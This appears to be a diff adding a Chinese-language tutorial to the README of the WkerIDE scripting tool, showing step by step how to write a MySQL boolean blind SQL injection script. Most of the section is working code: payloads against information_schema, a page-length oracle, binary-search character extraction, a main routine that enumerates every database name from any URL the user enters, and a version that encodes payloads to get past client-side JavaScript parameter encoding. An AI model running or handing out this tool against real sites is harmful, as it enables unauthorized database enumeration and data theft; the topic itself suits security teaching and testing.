@@ -892,3 +892,643 @@ usage: java -jar WkerIDE.jar -g
 1. 修复对象引用问题
 2. 增加支持的全方面显示
 3. 增建新特性#include 引入script下面的指定文件
+
+## 由浅入深编写SQL注入脚本
+
+### SQL注入脚本的构思
+
+在此先需要提前声明一下，做次文章只是为了扩大大家的学习兴趣。
+
+1. 目标数据库：mysql数据库
+2. 使用的注入方法：盲注
+3. 目标的得到的数据：数据库列表
+
+tips：mysql是比较典型的注入，盲注也比较合适对脚本编写的理解，只得到数据库列表是因为获取表，列以及数据其实都是一样的（如果你看懂这篇文章的话呢）
+
+### 原理
+
+首先我们要知道盲注的原理：通过注入我们的恶意语句来得到使得服务器将我们的恶意语句（存在判断数据是否正确）带入到查询中，然后通过返回的页面来判断是否是正确的判断逻辑。
+
+通常的来说我们盲注数据库列表需要下面三个步骤：
+
+1. 获取数据库的个数
+2. 获取某个数据库的名称长度
+3. 按长度将每个字符的值取出
+
+通常使用的payload：
+
+```mysql
+ and (select count(SCHEMA_NAME) from information_schema.SCHEMATA) >
+ and (SELECT char_length((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ” ＋ 到文本 (数据库编号 － 1) ＋ “,1))) >
+ and (SELECT ascii(SUBSTRING((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ” ＋ 到文本 (数据库编号 － 1) ＋ “,1),” ＋ 到文本 (位数) ＋ “,1)))>
+```
+
+我没有添加最后的数字。
+
+实际上在mysql中有一个information_schema库保存着整个数据库的信息，如果对payload有不理解请先去了解一下为什么这个可以得到数据。
+
+### 编写思路
+
+判断个数和长度其实无非就是递增最后的变量，然后得到最后返回错误页面的变量值，那么如何判断页面是否返回正确呢？其实可以通过返回页面的内容的长度进行判断，我们首先要获得正常页面的长度，然后与注入payload返回页面的长度进行比较就可以知道是否是正常的页面。
+
+### 判断页面是否正确
+
+首先给大家先看一下文件结构：
+
+![file](C:/Users/a/Desktop/1.26/jpg/27.jpg)
+
+1. SQLAttack.wker 脚本中保存着基本的注入方法
+2. MYSQLAttack.wker 脚本中保存着mysql注入的相关方法
+3. MYSQL_Interject.wker 脚本中含有mysql注入的逻辑
+4. encryption.wker 暂时先不解释 （主要是解决存在js加密的）
+5. js.js 含有js加密方法
+
+因为我们在后面会遇到传参过程中存在非明文的情况，所以我们需要先写一个js的加密方法（这个后面会详细讲解js加密之后的注入脚本）
+
+好了，我们开始回到正题，首先我们需要先编写SQLAttack.wker的方法
+
+判断页面是否正确：
+
+```js
+function JudgeRESEqule(url,length){
+	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+	if(GetStrLength(res[0]) == length){
+		return 1;
+	}else{
+		return 0;
+	}
+}
+```
+
+很简单，就是通过请求url得到页面的内容，然后判断是否和正常的长度相同，相同返回1，不相同返回0.
+
+### 获取数据库的个数
+
+首先我们先编写一个通用的获取长度的方法：其实就是一个递增的过程，使用while循环，一直进行递增，知道我们的页面不正确的时候就返回。
+
+```js
+function TakeLength(url,sentence,length){
+	i = 0;
+	while(JudgeRESEqule(url.URLEncode(sentence.i),length) == 1){
+		i = ToInt(i+2);
+	}
+	if(JudgeRESEqule(url.URLEncode(sentence.(i-1)),length) == 1){
+		return ToInt(i);
+	}else{
+		return ToInt(i-1);
+	}
+}
+```
+
+我们使用while循环一直调用前面写好的`JudgeRESEqule`函数，直到页面不正确则返回！
+
+1. 第一个参数是url不带参数值的
+2. 第二个参数是注入的语句
+3. 第三个参数是页面的正确长度
+
+写出这个基础函数之后我们就需要编写获取数据库个数的方法了：
+
+```js
+function GetDataBaseNum(url,length,ArgDefalutText){
+	return TakeLength(url,ArgDefalutText." and (select count(SCHEMA_NAME) from information_schema.SCHEMATA) >",length);
+}
+```
+
+这个方法写在MYSQLAttack.wker这个文件里面，因为我们现在要针对mysql进行编写了。
+
+1. 参数1：检测的url
+2. 参数2：正常的页面长度
+3. 参数3：没有注入时候正常的参数（id=96这里的96就是正常的参数）
+
+由于我们在MYSQLAttack.wker中使用了SQLAttack.wker的方法，所以我们需要引入这个文件：
+
+```c++
+#include ATTACKUTILS/SQLAttack.wker
+```
+
+这个方法其实无非就是调用我们之前写好的`TakeLength`方法得到返回错误时候的值。
+
+### 获取数据库名称的长度
+
+这个方法也是写在MYSQLAttack.wker当中的：
+
+```js
+function GetDataBaseLength(url,length,DataBaseindex,ArgDefalutText){
+	return TakeLength(url,ArgDefalutText." and (SELECT char_length((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ".DataBaseindex.",1))) >",length);
+}
+```
+
+相对于获取数据库的个数，我们这里多了一个DataBaseindex的参数，用来得到指定编号的数据库名称的长度，思路和获取数据库个数一样的，只不过payload不一样罢了。
+
+### 获取页面的正常长度
+
+通过访问正常页面得到原先的长度值：
+
+```js
+function GetRealLength(url){
+	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+	return GetStrLength(res[0]);
+}
+```
+
+### 二分法判断某一位的值
+
+正方法是写在SQLAttack.wker中的，因为是基础方法
+
+二分法如果不清楚的话呢去百度一下很简单的，二分法的代码：
+
+```js
+function dichotomy(url,sentence,length){
+	max = 128;
+	min = 0;
+	medium = 64;
+	while((max-min) > 1){
+		if(JudgeRESEqule(url.URLEncode(sentence.medium),length) == 1){
+			min = medium;
+		}else{
+			max = medium;
+		}
+		medium = ToInt((max+min)/2);
+	}
+	if(JudgeRESEqule(url.URLEncode(sentence.ToInt(min)),length) == 1){
+		return ToInt(max);
+	}else{
+		return ToInt(min);
+	}
+}
+```
+
+因为我们要从0-128中猜一个数字，所以我们就定义最大最小值为128和0。
+
+然后我们还是通过`JudgeRESEqule`判断我们猜的值对不对。
+
+参数和`TakeLength`一样
+
+### 获取数据库某一位的值
+
+```js
+function GetDataBaseStr(url,length,DataBaseindex,StringIndex,ArgDefalutText){
+	return AsciiToChar(dichotomy(url,ArgDefalutText." and (SELECT ascii(SUBSTRING((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ".DataBaseindex.",1),".StringIndex.",1)))>",length));
+}
+```
+
+这个方法是写在MYSQLAttack.wker中的，这里我们通过二分法得到ASCII的值之后，我们就是用`AsciiToChar`函数得到对应的值。
+
+二分法最后猜出来的数值就是某个字符的ASCII码。
+
+这个方法多了StringIndex参数，主要是用来定位猜解第几个字符。
+
+### 主逻辑
+
+```js
+#include ATTACKUTILS/MYSQLAttack.wker
+function main(args)
+{
+	print("请输入您要测试的URL(不要带参数的值):");
+	url =input();
+	print("请输入参数的默认值:");
+	par = input();
+	length = GetRealLength(url.par);
+	DataBaseNum = GetDataBaseNum(url,length,par);
+	i = 0;
+	while(i<DataBaseNum){
+		DataBaseLength =GetDataBaseLength(url,length,i,par);
+		j = 0;
+		DataBaseName= "";
+		while(j <DataBaseLength){
+			DataBaseName = DataBaseName.GetDataBaseStr(url,length,i,ToInt(j+1),par);
+			j=ToInt(j+1);
+		}
+		i = ToInt(i+1);
+		print(DataBaseName);
+	}
+}
+```
+
+首先我们先导入MYSQLAttack.wker。
+
+然后让用户输入注入的URL以及默认参数值。
+
+然后获取正常页面的长度，然后获取数据库的个数，进入while循环，遍历每一个数据库
+
+先获取数据库名称的长度，然后遍历每一个字符的值，最终打印处数据库的名称。
+
+我们来看一下最后的执行结果：
+
+![res](C:/Users/a/Desktop/1.26/jpg/28.jpg)
+
+可以看到我们最终跑出了所有的数据库名称。
+
+### 存在js加密的注入
+
+在我们传递payload的过程中经常能碰到存在参数加密的事情，首先我们要对参数加上payload进行加密，那么我们就要找出加密的方法：
+
+找js加密不是我们这里要讲的，所以这里我就给大家找出了js的加密算法：
+
+```js
+function enc() {  
+   
+    // private property  
+    _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";  
+   
+    // public method for encoding  
+    this.encode = function (input) {  
+        var output = "";  
+        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;  
+        var i = 0;  
+        input = _utf8_encode(input);  
+        while (i < input.length) {  
+            chr1 = input.charCodeAt(i++);  
+            chr2 = input.charCodeAt(i++);  
+            chr3 = input.charCodeAt(i++);  
+            enc1 = chr1 >> 2;  
+            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);  
+            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);  
+            enc4 = chr3 & 63;  
+            if (isNaN(chr2)) {  
+                enc3 = enc4 = 64;  
+            } else if (isNaN(chr3)) {  
+                enc4 = 64;  
+            }  
+            output = output +  
+            _keyStr.charAt(enc1) + _keyStr.charAt(enc2) +  
+            _keyStr.charAt(enc3) + _keyStr.charAt(enc4);  
+        }  
+        return output;  
+    }  
+   
+    // public method for decoding  
+    this.decode = function (input) {  
+        var output = "";  
+        var chr1, chr2, chr3;  
+        var enc1, enc2, enc3, enc4;  
+        var i = 0;  
+        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");  
+        while (i < input.length) {  
+            enc1 = _keyStr.indexOf(input.charAt(i++));  
+            enc2 = _keyStr.indexOf(input.charAt(i++));  
+            enc3 = _keyStr.indexOf(input.charAt(i++));  
+            enc4 = _keyStr.indexOf(input.charAt(i++));  
+            chr1 = (enc1 << 2) | (enc2 >> 4);  
+            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);  
+            chr3 = ((enc3 & 3) << 6) | enc4;  
+            output = output + String.fromCharCode(chr1);  
+            if (enc3 != 64) {  
+                output = output + String.fromCharCode(chr2);  
+            }  
+            if (enc4 != 64) {  
+                output = output + String.fromCharCode(chr3);  
+            }  
+        }  
+        output = _utf8_decode(output);  
+        return output;  
+    }  
+   
+    // private method for UTF-8 encoding  
+    _utf8_encode = function (string) {  
+        string = string.replace(/\r\n/g,"\n");  
+        var utftext = "";  
+        for (var n = 0; n < string.length; n++) {  
+            var c = string.charCodeAt(n);  
+            if (c < 128) {  
+                utftext += String.fromCharCode(c);  
+            } else if((c > 127) && (c < 2048)) {  
+                utftext += String.fromCharCode((c >> 6) | 192);  
+                utftext += String.fromCharCode((c & 63) | 128);  
+            } else {  
+                utftext += String.fromCharCode((c >> 12) | 224);  
+                utftext += String.fromCharCode(((c >> 6) & 63) | 128);  
+                utftext += String.fromCharCode((c & 63) | 128);  
+            }  
+   
+        }  
+        return utftext;  
+    }  
+   
+    // private method for UTF-8 decoding  
+    _utf8_decode = function (utftext) {  
+        var string = "";  
+        var i = 0;  
+        var c = c1 = c2 = 0;  
+        while ( i < utftext.length ) {  
+            c = utftext.charCodeAt(i);  
+            if (c < 128) {  
+                string += String.fromCharCode(c);  
+                i++;  
+            } else if((c > 191) && (c < 224)) {  
+                c2 = utftext.charCodeAt(i+1);  
+                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));  
+                i += 2;  
+            } else {  
+                c2 = utftext.charCodeAt(i+1);  
+                c3 = utftext.charCodeAt(i+2);  
+                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));  
+                i += 3;  
+            }  
+        }  
+        return string;  
+    }  
+}
+```
+
+我们发现他发送请求的url是：http://127.0.0.1:8080/encGet.php?n=OTY%3D
+
+然后通过分析n参数实际上是调用了上面js的enc中的encode方法，所以我们在注入的过程中我们也需要将我们的payload连通参数一起进行加密。
+
+Wker_TestLangue中自带了js加密的方法：
+
+```js
+function Enc(str)
+{
+	return RunJS(ReadFile("js.js"),"e",str);
+}
+
+```
+
+1. 参数1:js代码
+2. 参数2:调用的函数名称
+3. 参数3:js函数列表
+
+我们的js文件：
+
+```js
+function enc() {  
+   
+    // private property  
+    _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";  
+   
+    // public method for encoding  
+    this.encode = function (input) {  
+        var output = "";  
+        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;  
+        var i = 0;  
+        input = _utf8_encode(input);  
+        while (i < input.length) {  
+            chr1 = input.charCodeAt(i++);  
+            chr2 = input.charCodeAt(i++);  
+            chr3 = input.charCodeAt(i++);  
+            enc1 = chr1 >> 2;  
+            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);  
+            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);  
+            enc4 = chr3 & 63;  
+            if (isNaN(chr2)) {  
+                enc3 = enc4 = 64;  
+            } else if (isNaN(chr3)) {  
+                enc4 = 64;  
+            }  
+            output = output +  
+            _keyStr.charAt(enc1) + _keyStr.charAt(enc2) +  
+            _keyStr.charAt(enc3) + _keyStr.charAt(enc4);  
+        }  
+        return output;  
+    }  
+   
+    // public method for decoding  
+    this.decode = function (input) {  
+        var output = "";  
+        var chr1, chr2, chr3;  
+        var enc1, enc2, enc3, enc4;  
+        var i = 0;  
+        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");  
+        while (i < input.length) {  
+            enc1 = _keyStr.indexOf(input.charAt(i++));  
+            enc2 = _keyStr.indexOf(input.charAt(i++));  
+            enc3 = _keyStr.indexOf(input.charAt(i++));  
+            enc4 = _keyStr.indexOf(input.charAt(i++));  
+            chr1 = (enc1 << 2) | (enc2 >> 4);  
+            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);  
+            chr3 = ((enc3 & 3) << 6) | enc4;  
+            output = output + String.fromCharCode(chr1);  
+            if (enc3 != 64) {  
+                output = output + String.fromCharCode(chr2);  
+            }  
+            if (enc4 != 64) {  
+                output = output + String.fromCharCode(chr3);  
+            }  
+        }  
+        output = _utf8_decode(output);  
+        return output;  
+    }  
+   
+    // private method for UTF-8 encoding  
+    _utf8_encode = function (string) {  
+        string = string.replace(/\r\n/g,"\n");  
+        var utftext = "";  
+        for (var n = 0; n < string.length; n++) {  
+            var c = string.charCodeAt(n);  
+            if (c < 128) {  
+                utftext += String.fromCharCode(c);  
+            } else if((c > 127) && (c < 2048)) {  
+                utftext += String.fromCharCode((c >> 6) | 192);  
+                utftext += String.fromCharCode((c & 63) | 128);  
+            } else {  
+                utftext += String.fromCharCode((c >> 12) | 224);  
+                utftext += String.fromCharCode(((c >> 6) & 63) | 128);  
+                utftext += String.fromCharCode((c & 63) | 128);  
+            }  
+   
+        }  
+        return utftext;  
+    }  
+   
+    // private method for UTF-8 decoding  
+    _utf8_decode = function (utftext) {  
+        var string = "";  
+        var i = 0;  
+        var c = c1 = c2 = 0;  
+        while ( i < utftext.length ) {  
+            c = utftext.charCodeAt(i);  
+            if (c < 128) {  
+                string += String.fromCharCode(c);  
+                i++;  
+            } else if((c > 191) && (c < 224)) {  
+                c2 = utftext.charCodeAt(i+1);  
+                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));  
+                i += 2;  
+            } else {  
+                c2 = utftext.charCodeAt(i+1);  
+                c3 = utftext.charCodeAt(i+2);  
+                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));  
+                i += 3;  
+            }  
+        }  
+        return string;  
+    }  
+}
+function e(str)
+{
+	var base = new enc();
+	return base.encode(str);
+}
+```
+
+其实只是在上面的代码中增加了对js加密的调用也就是e函数。
+
+因为含有了js加密，所以我们之前写好的代码需要稍作调整：
+
+```js
+#include ATTACKUTILS/encryption.wker
+function GetRealLength(url){
+	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+	return GetStrLength(res[0]);
+}
+function JudgeRESEqule(url,length){
+	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+	if(GetStrLength(res[0]) == length){
+		return 1;
+	}else{
+		return 0;
+	}
+}
+function dichotomy(url,sentence,length){
+	max = 128;
+	min = 0;
+	medium = 64;
+	while((max-min) > 1){
+		if(JudgeRESEqule(url.URLEncode(Enc(sentence.medium)),length) == 1){
+			min = medium;
+		}else{
+			max = medium;
+		}
+		medium = ToInt((max+min)/2);
+	}
+	if(JudgeRESEqule(url.URLEncode(Enc(sentence.ToInt(min))),length) == 1){
+		return ToInt(max);
+	}else{
+		return ToInt(min);
+	}
+}
+function TakeLength(url,sentence,length){
+	i = 0;
+	while(JudgeRESEqule(url.URLEncode(Enc(sentence.i)),length) == 1){
+		i = ToInt(i+2);
+	}
+	if(JudgeRESEqule(url.URLEncode(Enc(sentence.(i-1))),length) == 1){
+		return ToInt(i);
+	}else{
+		return ToInt(i-1);
+	}
+}
+```
+
+可以看到，我只是在进行payload拼接的时候将payload和参数进行了js的加密。
+
+这样子我们只需要修改js.js文件中的e函数就可以实现js加密的注入了。
+
+让给我们看下最后的结果：
+
+![res](C:/Users/a/Desktop/1.26/jpg/29.jpg)
+
+可以看到我们即使存在js也是可以注入成功的，这样增加了程序的灵活性
+
+### 存在验证码
+
+存在验证码的话呢请看之前的文章，如何实现存在验证码的暴力破解
+
+### 后记
+
+其实我这里编写的只是一个框架，如果js加密比较复杂那么还是需要进行许多其他的获取，这里只是最简单的操作
+
+最终附带所有代码：
+
+MYSQL_Interject.wker
+
+```js
+#include ATTACKUTILS/MYSQLAttack.wker
+function main(args)
+{
+	print("请输入您要测试的URL(不要带参数的值):");
+	url =input();
+	print("请输入参数的默认值:");
+	par = input();
+	length = GetRealLength(url.Enc(par));
+	DataBaseNum = GetDataBaseNum(url,length,par);
+	i = 0;
+	while(i<DataBaseNum){
+		DataBaseLength =GetDataBaseLength(url,length,i,par);
+		j = 0;
+		DataBaseName= "";
+		while(j <DataBaseLength){
+			DataBaseName = DataBaseName.GetDataBaseStr(url,length,i,ToInt(j+1),par);
+			j=ToInt(j+1);
+		}
+		i = ToInt(i+1);
+		print(DataBaseName);
+	}
+}
+```
+
+MYSQLAttack.wker
+
+```js
+#include ATTACKUTILS/SQLAttack.wker
+
+function GetDataBaseNum(url,length,ArgDefalutText){
+	return TakeLength(url,ArgDefalutText." and (select count(SCHEMA_NAME) from information_schema.SCHEMATA) >",length);
+}
+function GetDataBaseLength(url,length,DataBaseindex,ArgDefalutText){
+	return TakeLength(url,ArgDefalutText." and (SELECT char_length((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ".DataBaseindex.",1))) >",length);
+}
+function GetDataBaseStr(url,length,DataBaseindex,StringIndex,ArgDefalutText){
+	return AsciiToChar(dichotomy(url,ArgDefalutText." and (SELECT ascii(SUBSTRING((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ".DataBaseindex.",1),".StringIndex.",1)))>",length));
+}
+```
+
+SQLAttack.wker
+
+```js
+#include ATTACKUTILS/encryption.wker
+function GetRealLength(url){
+	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+	return GetStrLength(res[0]);
+}
+function JudgeRESEqule(url,length){
+	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+	if(GetStrLength(res[0]) == length){
+		return 1;
+	}else{
+		return 0;
+	}
+}
+function dichotomy(url,sentence,length){
+	max = 128;
+	min = 0;
+	medium = 64;
+	while((max-min) > 1){
+		if(JudgeRESEqule(url.URLEncode(Enc(sentence.medium)),length) == 1){
+			min = medium;
+		}else{
+			max = medium;
+		}
+		medium = ToInt((max+min)/2);
+	}
+	if(JudgeRESEqule(url.URLEncode(Enc(sentence.ToInt(min))),length) == 1){
+		return ToInt(max);
+	}else{
+		return ToInt(min);
+	}
+}
+function TakeLength(url,sentence,length){
+	i = 0;
+	while(JudgeRESEqule(url.URLEncode(Enc(sentence.i)),length) == 1){
+		i = ToInt(i+2);
+	}
+	if(JudgeRESEqule(url.URLEncode(Enc(sentence.(i-1))),length) == 1){
+		return ToInt(i);
+	}else{
+		return ToInt(i-1);
+	}
+}
+```
+
+encryption.wker
+
+```js
+function Enc(str)
+{
+	//return str;
+	return RunJS(ReadFile("script\ATTACKUTILS\js.js"),"e",str);
+}
+```
+
+js代码就不带了。
